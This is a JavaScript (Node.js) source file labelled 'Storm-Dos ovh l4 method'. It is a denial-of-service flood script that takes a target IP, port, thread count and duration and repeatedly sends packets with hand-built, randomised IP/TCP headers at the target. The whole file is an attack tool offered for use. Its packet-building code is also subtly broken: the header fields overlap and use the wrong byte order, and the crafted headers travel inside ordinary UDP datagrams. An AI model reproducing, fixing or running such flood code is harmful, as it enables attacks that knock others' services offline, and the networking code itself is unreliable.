// Storm-Dos ovh l4 method
const dgram = require('dgram');
const { networkInterfaces } = require('os');

const MAX_PACKET_SIZE = 4096;
const PHI = 0x9e3779b9;

let Q = new Array(4096);
let c = 362436;
let floodPort;
let sleepTime = 100;
let limiter;

function initRand(x) {
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (let i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

function randCmwc() {
    let t, a = 18782;
    let i = 4095;
    let x;
    let r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >>> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

function csum(ptr, nbytes) {
    let sum = 0;
    let oddbyte;
    let answer;

    while (nbytes > 1) {
        sum += ptr.readUInt16LE(0);
        ptr = ptr.slice(2);
        nbytes -= 2;
    }
    if (nbytes === 1) {
        oddbyte = 0;
        oddbyte = ptr.readUInt8(0);
        sum += oddbyte;
    }

    sum = (sum >>> 16) + (sum & 0xffff);
    sum = sum + (sum >>> 16);
    answer = ~sum & 0xffff;

    return answer;
}

function utilExternalAddr() {
    const interfaces = networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (!iface.internal && iface.family === 'IPv4') {
                return iface.address;
            }
        }
    }
    return '127.0.0.1';
}

function setupTcpHeader(tcpHeader) {
    tcpHeader.source = randCmwc() & 0xFFFF;
    tcpHeader.seq = randCmwc() & 0xFFFF;
    tcpHeader.ack_seq = randCmwc() & 0xFFFF;
    tcpHeader.res2 = 0;
    tcpHeader.doff = 5;
    tcpHeader.ack = 1;
    tcpHeader.psh = 1;
    tcpHeader.fin = 0;
    tcpHeader.window = randCmwc() & 0xFFFF;
    tcpHeader.check = 0;
    tcpHeader.urg_ptr = 0;
}

function flood(td) {
    const datagram = Buffer.alloc(MAX_PACKET_SIZE);
    const ipHeader = datagram;
    const tcpHeader = datagram.slice(20);
    const randomLength = Math.floor(Math.random() * (120 - 90 + 1)) + 90;

    const sin = {
        family: 'IPv4',
        port: floodPort,
        address: td
    };

    const s = dgram.createSocket('udp4');

    const data = datagram.slice(20 + 20);
    for (let i = 0; i < randomLength; i++) {
        data.writeUInt8(Math.floor(Math.random() * 256), i);
    }

    ipHeader.writeUInt8(0x45, 0);
    ipHeader.writeUInt8(0, 1);
    ipHeader.writeUInt16LE(20 + 20 + randomLength, 2);
    ipHeader.writeUInt32LE(Math.floor(Math.random() * 4294967295), 4);
    ipHeader.writeUInt32LE(0, 8);
    ipHeader.writeUInt8(111, 9);
    ipHeader.writeUInt8(6, 10);
    ipHeader.writeUInt16LE(0, 12);
    ipHeader.writeUInt32LE(utilExternalAddr().split('.').reduce((acc, val, i) => acc + parseInt(val) * Math.pow(256, 3 - i), 0), 16);
    ipHeader.writeUInt32LE(sin.address.split('.').reduce((acc, val, i) => acc + parseInt(val) * Math.pow(256, i), 0), 12);

    const pseudoHeader = Buffer.alloc(12);
    pseudoHeader.writeUInt32LE(utilExternalAddr().split('.').reduce((acc, val, i) => acc + parseInt(val) * Math.pow(256, 3 - i), 0), 0);
    pseudoHeader.writeUInt32LE(sin.address.split('.').reduce((acc, val, i) => acc + parseInt(val) * Math.pow(256, i), 0), 4);
    pseudoHeader.writeUInt8(0, 8);
    pseudoHeader.writeUInt8(6, 9);
    pseudoHeader.writeUInt16LE(20 + randomLength, 10);

    const pseudoChecksum = csum(Buffer.concat([pseudoHeader, tcpHeader, data]), 12 + 20 + randomLength);
    tcpHeader.writeUInt16LE(pseudoChecksum, 16);

    for (let i = 0; i < 1000; i++) {
        setupTcpHeader(tcpHeader);
        s.send(datagram, floodPort, td, (err) => {
            if (err) {
                console.error('Error sending packet:', err);
            }
        });
    }
}

if (process.argv.length !== 6) {
    console.log('Usage: node script.js <target IP> <port> <threads> <time>');
    process.exit(1);
}

console.log('Setting up networking...');

const targetIP = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const numThreads = parseInt(process.argv[4]);
const time = parseInt(process.argv[5]);

floodPort = targetPort;
const targetBandwidth_bps = 100 * 1000000;
const packetSize_bits = MAX_PACKET_SIZE * 8;
const packetsPerSecond = Math.ceil(targetBandwidth_bps / packetSize_bits);

console.log(`Flood rate: ${packetsPerSecond} packets per second`);

console.log('Starting...');

const threads = [];

for (let i = 0; i < numThreads; i++) {
   
    threads.push(setInterval(() => flood(targetIP), 1000 / packetsPerSecond));
}

setTimeout(() => {
    console.log('Time is up. Stopping threads...');
    threads.forEach(thread => clearInterval(thread));
    process.exit(0);
}, time * 1000);
